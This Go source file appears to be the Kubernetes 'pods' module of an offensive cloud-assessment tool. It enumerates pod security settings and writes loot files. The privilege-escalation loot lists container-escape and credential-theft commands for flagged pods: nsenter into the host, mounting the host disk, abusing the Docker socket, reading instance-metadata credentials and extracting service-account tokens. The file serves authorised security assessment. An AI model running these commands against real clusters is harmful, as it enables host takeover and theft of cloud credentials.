package commands

import (
	"context"
	"fmt"
	"os"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

var PodsCmd = &cobra.Command{
	Use:     "pods",
	Aliases: []string{},
	Short:   "List all cluster pods",
	Long: `
List all cluster pods and detailed information:
  cloudfox kubernetes pods`,
	Run: ListPods,
}

type PodsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t PodsOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t PodsOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

func ListPods(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating cluster pods for %s", globals.ClusterName), globals.K8S_PODS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing namespaces: %v", err), globals.K8S_PODS_MODULE_NAME)
		return
	}

	headers := []string{
		"Namespace", "Pod Name", "Pod IP", "Service Account", "Node",
		"HostPID", "HostIPC", "HostNetwork", "Privileged", "HostPaths",
		"RunAsUser", "Capabilities", "Image", "ImageTagType", "Labels",
		"Affinity", "Tolerations", "Annotations",
		"Cloud Provider", "Cloud Role",
	}

	var outputRows [][]string

	// Namespace-organized loot
	namespaceLootExec := map[string][]string{}
	namespaceLootEnum := map[string][]string{}
	var lootPrivEsc []string
	var riskyPods []string

	lootPrivEsc = append(lootPrivEsc, `#####################################
##### Pod Privilege Escalation
#####################################
#
# MANUAL EXECUTION REQUIRED
# Pods with security misconfigurations
# that can be leveraged for privilege escalation
#
`)

	for _, ns := range namespaces.Items {
		pods, err := clientset.CoreV1().Pods(ns.Name).List(ctx, metav1.ListOptions{})
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error listing pods in namespace %s: %v\n", ns.Name, err)
			continue
		}

		for _, pod := range pods.Items {
			privileged := "false"
			runAsUser := "<unset>"
			capabilities := []string{}
			images := []string{}
			tagTypes := []string{}

			for _, container := range append(pod.Spec.InitContainers, pod.Spec.Containers...) {
				if container.SecurityContext != nil {
					if container.SecurityContext.Privileged != nil && *container.SecurityContext.Privileged {
						privileged = "true"
					}
					if container.SecurityContext.RunAsUser != nil {
						if *container.SecurityContext.RunAsUser == 0 {
							runAsUser = "root"
						} else {
							runAsUser = fmt.Sprintf("%d", *container.SecurityContext.RunAsUser)
						}
					}
					if container.SecurityContext != nil && container.SecurityContext.Capabilities != nil {
						for _, cap := range container.SecurityContext.Capabilities.Add {
							capabilities = append(capabilities, string(cap))
						}
						for _, cap := range container.SecurityContext.Capabilities.Drop {
							capabilities = append(capabilities, "-"+string(cap))
						}
					}

				}

				// Image info
				images = append(images, container.Image)
				tagTypes = append(tagTypes, k8sinternal.ImageTagType(container.Image))

			}

			// Labels
			labels := "<NONE>"
			if len(pod.Labels) > 0 {
				var parts []string
				for k, v := range pod.Labels {
					parts = append(parts, fmt.Sprintf("%s=%s", k, v))
				}
				sort.Strings(parts)
				labels = strings.Join(parts, ",")
			}

			// Affinity
			affinity := "<NONE>"
			if pod.Spec.Affinity != nil {
				affinity = fmt.Sprintf("%+v", *pod.Spec.Affinity)
			}

			// Tolerations
			tolerations := "<NONE>"
			if len(pod.Spec.Tolerations) > 0 {
				var tParts []string
				for _, t := range pod.Spec.Tolerations {
					tParts = append(tParts, fmt.Sprintf("Key=%s,Operator=%s,Value=%s,Effect=%s", t.Key, string(t.Operator), t.Value, string(t.Effect)))
				}
				tolerations = strings.Join(tParts, "; ")
			}

			// Annotations
			annotations := "<NONE>"
			if len(pod.Annotations) > 0 {
				var parts []string
				for k, v := range pod.Annotations {
					parts = append(parts, fmt.Sprintf("%s=%s", k, v))
				}
				sort.Strings(parts)
				annotations = strings.Join(parts, ",")
			}

			// HostPaths
			var hostPathLines []string
			for _, volume := range pod.Spec.Volumes {
				if volume.HostPath != nil {
					mountPoint := k8sinternal.FindMountPath(volume.Name, pod.Spec.Containers)
					hostPathLines = append(hostPathLines, fmt.Sprintf("%s:%s", volume.HostPath.Path, mountPoint))
				}
			}
			hostPaths := "<NONE>"
			if len(hostPathLines) > 0 {
				hostPaths = strings.Join(hostPathLines, "\n")
			}

			roleResults := k8sinternal.DetectCloudRole(ctx, clientset, pod.Namespace, pod.Spec.ServiceAccountName, &pod.Spec, pod.Annotations)

			// Access the provider and role like this:
			cloudProvider := "<NONE>"
			cloudRole := "<NONE>"
			if len(roleResults) > 0 {
				cloudProvider = roleResults[0].Provider
				cloudRole = roleResults[0].Role
			}

			row := []string{
				pod.Namespace,
				pod.Name,
				k8sinternal.NonEmpty(pod.Status.PodIP),
				k8sinternal.NonEmpty(pod.Spec.ServiceAccountName),
				k8sinternal.NonEmpty(pod.Spec.NodeName),
				fmt.Sprintf("%v", pod.Spec.HostPID),
				fmt.Sprintf("%v", pod.Spec.HostIPC),
				fmt.Sprintf("%v", pod.Spec.HostNetwork),
				privileged,
				hostPaths,
				runAsUser,
				strings.Join(capabilities, ","),
				strings.Join(images, ","),
				strings.Join(tagTypes, ","),
				labels,
				affinity,
				tolerations,
				annotations,
				cloudProvider,
				cloudRole,
			}
			outputRows = append(outputRows, row)

			// Loot: exec command
			namespaceLootExec[pod.Namespace] = append(namespaceLootExec[pod.Namespace],
				fmt.Sprintf("kubectl exec -it -n %s %s -- sh \n", pod.Namespace, pod.Name),
			)

			// Privilege escalation detection
			isRisky := false
			var riskFactors []string

			// Check for privileged containers
			if privileged == "true" {
				isRisky = true
				riskFactors = append(riskFactors, "PRIVILEGED")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# PRIVILEGED POD: %s/%s", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "# Privileged containers can escape to host:")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "# Inside container, try:")
				lootPrivEsc = append(lootPrivEsc, "# nsenter --target 1 --mount --uts --ipc --net --pid -- bash")
				lootPrivEsc = append(lootPrivEsc, "# Or mount host filesystem:")
				lootPrivEsc = append(lootPrivEsc, "# mkdir /host && mount /dev/sda1 /host && chroot /host")
				lootPrivEsc = append(lootPrivEsc, "")
			}

			// Check for hostPath mounts
			if len(hostPathLines) > 0 {
				isRisky = true
				riskFactors = append(riskFactors, "HOSTPATH")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# HOSTPATH MOUNT: %s/%s", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# Host paths: %s", strings.Join(hostPathLines, ", ")))
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))

				// Check for critical host paths
				for _, hp := range hostPathLines {
					if strings.Contains(hp, "/var/run/docker.sock") {
						lootPrivEsc = append(lootPrivEsc, "# CRITICAL: Docker socket mounted! Can control host containers:")
						lootPrivEsc = append(lootPrivEsc, "# docker -H unix:///var/run/docker.sock ps")
						lootPrivEsc = append(lootPrivEsc, "# docker -H unix:///var/run/docker.sock run -it --privileged --pid=host alpine nsenter --target 1 --mount --uts --ipc --net --pid -- bash")
					}
					if strings.Contains(hp, "/") && strings.Contains(hp, ":/") {
						parts := strings.Split(hp, ":")
						if len(parts) == 2 && parts[0] == "/" {
							lootPrivEsc = append(lootPrivEsc, "# CRITICAL: Root filesystem mounted!")
							lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# Access host filesystem at: %s", parts[1]))
						}
					}
				}
				lootPrivEsc = append(lootPrivEsc, "")
			}

			// Check for host namespaces
			if pod.Spec.HostPID {
				isRisky = true
				riskFactors = append(riskFactors, "HOSTPID")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# HOST PID NAMESPACE: %s/%s", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "# Can see and interact with host processes:")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "# ps aux  # Will show host processes")
				lootPrivEsc = append(lootPrivEsc, "# Try to inject into host process or use nsenter")
				lootPrivEsc = append(lootPrivEsc, "")
			}

			if pod.Spec.HostIPC {
				isRisky = true
				riskFactors = append(riskFactors, "HOSTIPC")
			}

			if pod.Spec.HostNetwork {
				isRisky = true
				riskFactors = append(riskFactors, "HOSTNETWORK")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# HOST NETWORK: %s/%s", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "# Pod uses host network namespace - can sniff host traffic:")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "# tcpdump -i any -w /tmp/capture.pcap")
				lootPrivEsc = append(lootPrivEsc, "")
			}

			// Check for root user
			if runAsUser == "root" || runAsUser == "<unset>" {
				isRisky = true
				riskFactors = append(riskFactors, "ROOT_USER")
			}

			// Check for dangerous capabilities
			dangerousCaps := []string{"SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE", "SYS_MODULE", "DAC_READ_SEARCH", "DAC_OVERRIDE"}
			for _, cap := range capabilities {
				for _, dangerous := range dangerousCaps {
					if strings.Contains(cap, dangerous) {
						isRisky = true
						riskFactors = append(riskFactors, fmt.Sprintf("CAP_%s", dangerous))
						lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# DANGEROUS CAPABILITY: %s/%s has %s", pod.Namespace, pod.Name, cap))

						if strings.Contains(cap, "SYS_ADMIN") {
							lootPrivEsc = append(lootPrivEsc, "# CAP_SYS_ADMIN allows container escape:")
							lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
							lootPrivEsc = append(lootPrivEsc, "# Try mounting host filesystem or using unshare/mount tricks")
						}

						if strings.Contains(cap, "SYS_PTRACE") {
							lootPrivEsc = append(lootPrivEsc, "# CAP_SYS_PTRACE allows process inspection and injection:")
							lootPrivEsc = append(lootPrivEsc, "# Can attach to processes with gdb or inject code")
						}

						if strings.Contains(cap, "SYS_MODULE") {
							lootPrivEsc = append(lootPrivEsc, "# CAP_SYS_MODULE allows loading kernel modules:")
							lootPrivEsc = append(lootPrivEsc, "# insmod malicious.ko")
						}

						lootPrivEsc = append(lootPrivEsc, "")
						break
					}
				}
			}

			// Check for cloud roles
			if cloudProvider != "<NONE>" && cloudRole != "<NONE>" {
				isRisky = true
				riskFactors = append(riskFactors, fmt.Sprintf("CLOUD_ROLE_%s", cloudProvider))
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# CLOUD ROLE ACCESS: %s/%s", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# Provider: %s, Role: %s", cloudProvider, cloudRole))
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))

				if cloudProvider == "AWS" {
					lootPrivEsc = append(lootPrivEsc, "# Inside pod, enumerate AWS permissions:")
					lootPrivEsc = append(lootPrivEsc, "# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
					lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", cloudRole))
					lootPrivEsc = append(lootPrivEsc, "# Or use AWS CLI if available:")
					lootPrivEsc = append(lootPrivEsc, "# aws sts get-caller-identity")
					lootPrivEsc = append(lootPrivEsc, "# aws iam list-attached-role-policies --role-name <role>")
				} else if cloudProvider == "GCP" {
					lootPrivEsc = append(lootPrivEsc, "# Inside pod, enumerate GCP permissions:")
					lootPrivEsc = append(lootPrivEsc, "# curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
					lootPrivEsc = append(lootPrivEsc, "# gcloud auth list")
					lootPrivEsc = append(lootPrivEsc, "# gcloud projects list")
				} else if cloudProvider == "Azure" {
					lootPrivEsc = append(lootPrivEsc, "# Inside pod, enumerate Azure permissions:")
					lootPrivEsc = append(lootPrivEsc, "# curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'")
					lootPrivEsc = append(lootPrivEsc, "# az account show")
				}
				lootPrivEsc = append(lootPrivEsc, "")
			}

			// Check for ServiceAccount tokens
			if pod.Spec.ServiceAccountName != "" && pod.Spec.ServiceAccountName != "default" {
				isRisky = true
				riskFactors = append(riskFactors, "SERVICEACCOUNT")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n# NON-DEFAULT SERVICEACCOUNT: %s/%s uses SA: %s", pod.Namespace, pod.Name, pod.Spec.ServiceAccountName))
				lootPrivEsc = append(lootPrivEsc, "# Extract and use the service account token:")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "# Inside pod:")
				lootPrivEsc = append(lootPrivEsc, "# SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)")
				lootPrivEsc = append(lootPrivEsc, "# kubectl --token=$SA_TOKEN auth can-i --list")
				lootPrivEsc = append(lootPrivEsc, "# Or from outside the cluster:")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -n %s %s -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "")
			}

			if isRisky {
				riskyPods = append(riskyPods, fmt.Sprintf("%s/%s (%s)", pod.Namespace, pod.Name, strings.Join(riskFactors, ", ")))
			}

			// Loot: describe + jq
			jqCmd := fmt.Sprintf(
				`kubectl get pod -n %s %s -o json | jq '{
Namespace: .metadata.namespace,
Name: .metadata.name,
PodIP: .status.podIP,
ServiceAccountName: .spec.serviceAccountName,
NodeName: .spec.nodeName,
HostPID: .spec.hostPID,
HostIPC: .spec.hostIPC,
HostNetwork: .spec.hostNetwork,
Privileged: ([.spec.initContainers[], .spec.containers[]] 
    | map(.securityContext.privileged // false) | any),
HostPaths: ([.spec.volumes[]? | select(.hostPath) 
    | {(.hostPath.path): .name}]),
RunAsUser: ([.spec.initContainers[], .spec.containers[]] 
    | map(.securityContext.runAsUser // empty) 
    | map(select(. != null)) | unique),
Capabilities: ([.spec.initContainers[], .spec.containers[]] 
    | map(.securityContext.capabilities.add // []) 
    | add? // [] | unique),
Images: ([.spec.initContainers[], .spec.containers[]] 
    | map(.image) | unique),
ImageTagType: ([.spec.initContainers[], .spec.containers[]] 
    | map(if (.image | contains(":")) then "Tagged" else "Latest" end) 
    | unique),
Labels: (.metadata.labels // {}),
Affinity: (.spec.affinity // {}),
Tolerations: (.spec.tolerations // []),
Annotations: (.metadata.annotations // {})
}'`, pod.Namespace, pod.Name)
			namespaceLootEnum[pod.Namespace] = append(namespaceLootEnum[pod.Namespace],
				fmt.Sprintf("kubectl describe pod -n %s %s", pod.Namespace, pod.Name),
				jqCmd,
			)
		}
	}

	// Build lootExec with namespace headers
	lootExec := []string{
		"#####################################",
		"##### Execute into running Kubernetes Pods",
		"#####################################",
		"",
	}
	if globals.KubeContext != "" {
		lootExec = append(lootExec, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	nsList := make([]string, 0, len(namespaceLootExec))
	for ns := range namespaceLootExec {
		nsList = append(nsList, ns)
	}
	sort.Strings(nsList)
	for i, ns := range nsList {
		lootExec = append(lootExec, fmt.Sprintf("\n# Namespace: %s\n", ns))
		lootExec = append(lootExec, namespaceLootExec[ns]...)
		if i < len(nsList)-1 {
			lootExec = append(lootExec, "")
		}
	}

	// Build lootEnum with namespace headers
	lootEnum := []string{
		"#####################################",
		"##### Enumerate Pod Information",
		"#####################################",
		"",
	}
	if globals.KubeContext != "" {
		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	nsListEnum := make([]string, 0, len(namespaceLootEnum))
	for ns := range namespaceLootEnum {
		nsListEnum = append(nsListEnum, ns)
	}
	sort.Strings(nsListEnum)
	for i, ns := range nsListEnum {
		lootEnum = append(lootEnum, fmt.Sprintf("\n# Namespace: %s\n", ns))
		lootEnum = append(lootEnum, namespaceLootEnum[ns]...)
		if i < len(nsListEnum)-1 {
			lootEnum = append(lootEnum, "")
		}
	}

	table := internal.TableFile{
		Name:   "Pods",
		Header: headers,
		Body:   outputRows,
	}

	lootExecute := internal.LootFile{
		Name:     "Pod-Execution",
		Contents: strings.Join(lootExec, "\n"),
	}

	lootDescribe := internal.LootFile{
		Name:     "Pod-Enum",
		Contents: strings.Join(lootEnum, "\n"),
	}

	// Add summary to privilege escalation loot
	if len(riskyPods) > 0 {
		summary := fmt.Sprintf("\n# SUMMARY: Found %d pods with privilege escalation potential:\n", len(riskyPods))
		for _, p := range riskyPods {
			summary += fmt.Sprintf("# - %s\n", p)
		}
		summary += "#\n# See detailed exploitation techniques below:\n"
		lootPrivEsc = append([]string{summary}, lootPrivEsc...)
	} else {
		lootPrivEsc = append(lootPrivEsc, "\n# No high-risk pods found with obvious privilege escalation vectors.\n")
		lootPrivEsc = append(lootPrivEsc, "# This does not mean the cluster is secure - review pod configurations manually.\n")
	}

	lootPrivEscalation := internal.LootFile{
		Name:     "Pod-Privilege-Escalation",
		Contents: strings.Join(lootPrivEsc, "\n"),
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Pods",
		globals.ClusterName,
		"results",
		PodsOutput{
			Table: []internal.TableFile{table},
			Loot:  []internal.LootFile{lootExecute, lootDescribe, lootPrivEscalation},
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_PODS_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d pods found across %d namespaces", len(outputRows), len(namespaces.Items)), globals.K8S_PODS_MODULE_NAME)
	} else {
		logger.InfoM("No pods found, skipping output file creation", globals.K8S_PODS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_PODS_MODULE_NAME), globals.K8S_PODS_MODULE_NAME)
}
